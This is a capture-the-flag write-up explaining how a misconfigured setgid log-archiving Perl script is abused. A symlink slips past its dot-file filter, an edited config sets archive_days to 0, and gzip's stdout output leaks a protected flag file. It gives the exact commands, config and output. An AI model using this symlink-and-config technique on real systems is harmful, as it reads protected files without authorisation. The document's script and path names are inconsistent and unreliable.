This level presents a `level.pl` perl script.

The script basically reads a config and depending on this config reads certain files in a directory and create a compressed archive of the valid files.

There is also a script `raven` that simply launches `ravel.pl` with the rights of the `flag06` group.

The config file in `/var/run/raven.conf` allows to configure a few option including the folder that the script will read (`log_dir`).
It only archives the files older than a certain numbers of days but this value can also be configured to 0 in order to archive all the flags.

After listing all the valid files the script try to compress them in an archive. However the command is launches that way : `system('/bin/gzip', '-c', $src)`, with the `-c` option which makes the data be print in the standard output instead of a file.

We can use this in order to retrieve the flag value by making the script archive the `.flag` file.

We could do so by puttin the home folder of flag06 as `log_dir` however the script filters the files starting with a dot (.). But we can bypass this restriction by creating a simlink of the .flag file like this for exemple : `ln -s /home/flag06/.flag /tmp/flag06/flag06_link`.

Because the name of the simlink dont start with a dot the script will not exclude it.

Now we can modify the configuration to run the script in the /tmp/flag06 folder including all files : ``` cat /etc/raven/raven.conf
# raven configuration
log_dir          = /tmp/flag06
max_size         = 10485760
retention_days   = 100
archive_days = 0
compress_archive = 1
loglevel_pattern = ^(DEBUG|INFO|WARN|ERROR):
enable_alerts = 0
enable_archive = 1
enable_report = 0
report_dir = /tmp/report
archive_dir = /tmp/archive
```

Now when launching the script and redirecting it's output we obtain this: `/opt/snowcrash/level06/raven > /tmp/out6`

``` cat /tmp/out6
qc(jflag6+ϬJ��ϨH�M�,��L4*��KL-6I��h
                                   ��Raven log analyser v2.4.1
  Total lines   : 1
  Matched       : 0
  Skipped files : 0
  Errors        : 0
```

We now just need to keep only the binary datas of the archive and exclude the logs by doing this : `head -c 52 out6 > out.gz`.

Which allows us to decompress it : `gzip -d < "out.gz" > "flag06"`.

And retrieve the flag : ```cat flag06 
wizelohxamaiuiia2uinaes4a
```
